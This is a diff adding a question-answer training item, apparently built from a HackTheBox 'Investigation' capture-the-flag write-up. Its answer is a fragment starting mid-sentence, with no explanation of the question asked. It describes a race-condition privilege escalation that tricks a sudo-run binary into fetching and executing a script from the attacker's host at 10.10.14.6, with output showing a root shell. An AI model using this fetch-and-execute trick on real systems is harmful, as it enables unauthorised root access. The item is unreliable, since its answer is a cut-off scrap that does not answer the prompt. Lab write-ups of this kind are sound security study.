@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+Provide a clear, comprehensive explanation of the following content: (Context: Writeup from Htb Investigation Hacks Stuff)
+
+CONTEXT:
+Source: Htb Investigation Hacks Stuff
+Section: Writeup
+
+METHOD / ANSWER:
+and copies 0xdf.sh over it. Then it sleeps for a second and removes the file. Now when I run binary , it doesn’t matter what’s in the file, but it has to exist (so that curl returns success and the file is executed). When I run this: smorton@investigation:~$ sudo binary 10.10.14.6/race lDnxUysaQn Running... uid=0(root) gid=0(root) groups=0(root) pwned It may not trigger every time, but it was most for me. Because it’s waiting for the file to appear, the timing works out that it moves it just at the right time.
